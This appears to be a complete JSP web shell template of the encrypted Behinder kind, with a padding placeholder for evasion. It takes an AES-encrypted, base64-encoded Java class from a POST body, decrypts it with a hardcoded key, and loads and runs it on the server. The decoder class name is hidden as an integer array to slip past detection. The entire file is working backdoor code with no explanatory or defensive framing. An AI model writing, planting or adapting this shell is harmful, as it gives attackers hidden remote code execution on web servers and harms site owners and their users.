<!-- {PADDING_DATA} -->
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%
if (request.getMethod().equals("POST")){
    String k="e45e329feb5d925b";
    session.putValue("u",k);

    String uploadString= request.getReader().readLine();
    Cipher c=Cipher.getInstance("AES");
    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));

    int[] aa=new int[]{115,117,110,46,109,105,115,99,46,66,65,83,69,54,52,68,101,99,111,100,101,114};
    String ccstr="";
    for (int i = 0;i<aa.length;i++)
    {
        ccstr=ccstr+(char)aa[i];
    }
    Class clazz = Class.forName(ccstr); 
    byte[] ss= (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), uploadString); 

    Object myLoader= new U(this.getClass().getClassLoader()).g(c.doFinal(ss)).newInstance();
    myLoader.equals(pageContext);
}
%>